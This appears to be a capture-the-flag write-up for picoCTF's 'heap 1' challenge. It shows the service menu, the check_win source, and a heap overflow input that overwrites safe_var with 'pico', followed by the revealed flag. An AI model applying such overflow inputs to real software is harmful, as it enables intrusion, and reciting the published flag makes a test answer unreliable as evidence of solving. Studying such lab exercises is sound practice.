# heap 1:Binary Exploitation:100pts
Can you control your overflow?  
Download the binary [here](chall).  
Download the source [here](chall.c).  
Connect with the challenge instance here:  
`nc tethys.picoctf.net 60375`  

Hints  
1  
How can you tell where safe_var starts?  

# Solution
The binary, source and destination are passed. When connected, [heap 0](.. It seems to be a continuation of the problem of /heap_0). 
```bash
$ nc tethys.picoctf.net 60375

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x559e220c62b0  ->   pico
+-------------+----------------+
[*]   0x559e220c62d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```
Looking at the source, the flag output location was as follows.  
```c
~~~
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
~~~
```
In heap 0, the safe_var was destroyed by overflow, but this time it should be rewritten to 'pico'. 
You can check it with Print safe_var, so you can adjust the number of characters to just right.  
```bash
$ nc tethys.picoctf.net 60375

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x55fc8e5d42b0  ->   pico
+-------------+----------------+
[*]   0x55fc8e5d42d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: SATOKISATOKISATOKISATOKISATOKISApico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_21306688}
```
The flag was displayed in Print Flag.
## picoCTF{starting_to_get_the_hang_21306688}